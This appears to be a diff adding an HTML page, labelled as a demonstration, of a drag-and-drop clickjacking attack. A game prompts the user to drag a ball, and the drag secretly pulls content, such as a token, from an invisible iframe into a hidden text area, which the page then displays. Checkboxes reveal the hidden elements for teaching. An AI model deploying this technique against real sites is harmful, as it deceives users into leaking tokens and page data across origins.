@@ -1,0 +1,139 @@
+<html>
+<head>
+<title>
+      Drag and Drop Attack Demo
+</title>
+<style>
+      .IFrame_hidden{height: 50px; width: 50px; top:360px; left:365px; overflow:hidden;
+      filter: alpha(opacity=0); opacity:.0; position: absolute; } .text_area_hidden{
+      height: 30px; width: 30px; top:180px; left:665px; border:1px solid black;
+      overflow:hidden; filter: alpha(opacity=0); opacity:.0;position: absolute;}
+      .ball{ top:350px; left:350px; position: absolute; } .ball_1{ top:136px;
+      left:640px; filter: alpha(opacity=0); opacity:.0; position: absolute; }.Dolphin{
+      top:150px; left:600px; position: absolute; }.center{ margin-right: auto;margin-left:
+      auto; vertical-align:middle;text-align:center; margin-top:350px;}
+</style>
+<script>
+      function Init() { //添加监听
+        var source = document.getElementById("source");
+        var target = document.getElementById("target");
+        if (source.addEventListener) {
+          target.addEventListener("drop", DumpInfo, false);
+        } else {
+          target.attachEvent("ondrop", DumpInfo);
+        }
+      }
+      function entities(s) {
+        var e = {
+          '"': '&quot;',
+          '&': '&amp;',
+          '<': '&lt;',
+          '>': '&gt;'
+        };
+        return s.replace(/["&<>]/g,
+        function(m) {
+          return e[m];
+        });
+      }
+      function DumpInfo(event) {
+        showHide_ball.call(this); //地面上的小球消失
+        showHide_ball_1.call(this); //海豚嘴上的小球出现
+        if (event.dataTransfer.types) { //Firefox浏览器支持
+          var info = document.getElementById("info");
+          info.innerHTML += "<span style='color:#3355cc;font-size:12px'>" + entities(event.dataTransfer.getData('text/html')) + "</span><br> ";//在页面上打印出获取到的数据
+        } else { //IE浏览器支持
+          setTimeout("html()", 10);
+        }
+      }
+
+      function html() {
+				document.getElementById('target').innerText = document.getElementById ('target').innerHTML;
+				var info = document.getElementById("info");
+        info.innerHTML += "<span style='color:#3355cc;font-size:12px'>" + (document.getElementById('target').innerHTML) + "</span><br> ";//在页面上打印出获取到的数据
+      }
+
+function showHide_frame() {
+        var IFrame_1 = document.getElementById("IFrame_1");
+				IFrame_1.style.opacity = this.checked ? "0.5": "0";
+				IFrame_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity= " + (this.checked ? "50": "0") + ");"
+      }
+      function showHide_text() {
+        var text_1 = document.getElementById("target");
+        text_1.style.opacity = this.checked ? "0.5": "0";
+        text_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha (opacity=" + (this.checked ? "50": "0") + ");"
+      }
+      function showHide_ball() {
+        var hide_ball = document.getElementById("hide_ball");
+        hide_ball.style.opacity = "0";
+        hide_ball.style.filter = "alpha(opacity=0)";
+      }
+      function showHide_ball_1() {
+        var hide_ball_1 = document.getElementById("hide_ball_1");
+        hide_ball_1.style.opacity = "1";
+        hide_ball_1.style.filter = "alpha(opacity=100)";
+      }
+      function reload_text() {
+        document.getElementById("target").value = '';
+      }
+</script>
+</head>
+
+<body onload="Init();">
+<center>
+<h1>
+        Drag and Drop Attack
+</h1>
+</center>
+<img id="hide_ball" src=ball.png class="ball">
+<div id="source">
+<iframe id="IFrame_1" src="http://192.168.10.101/Token.html
+" class="IFrame_hidden" scrolling="no">
+</iframe>
+</div>
+<img src=Dolphin.jpg class="Dolphin">
+<div>
+<img id="hide_ball_1" src=ball.png class="ball_1">
+</div>
+<div>
+<div id="target" class="text_area_hidden" contenteditable="true">
+        test
+</div>
+</div>
+<div id="info" style="position:absolute;background-color:#e0e0e0;font- weight:bold;top:600px;">
+</div>
+<center>
+游戏规则："Ctrl + A" 或滑动鼠标选中小球，然后把小球拖放到海豚的嘴上。
+<br>
+</center>
+<br>
+
+<br>
+<div class="center">
+<center>
+<center>
+<input id="showHide_frame" type="checkbox" onclick="showHide_frame.call (this);"
+          />
+<label for="showHide_frame">
+            Show the jacked I--Frame
+</label>
+          |
+<input id="showHide_text" type="checkbox" onclick="showHide_text.call(this);"
+          />
+<label for="showHide_text">
+            Show the jacked Textarea
+</label>
+          |
+<input type=button value="Replay" onclick="location.reload();reload_ text();">
+</center>
+<br>
+<br>
+<b>
+          Design by
+<a target="_blank" href="http://hi.baidu.com/xisigr">
+            xisigr
+</a>
+</b>
+</center>
+</div>
+</body>
+</html>
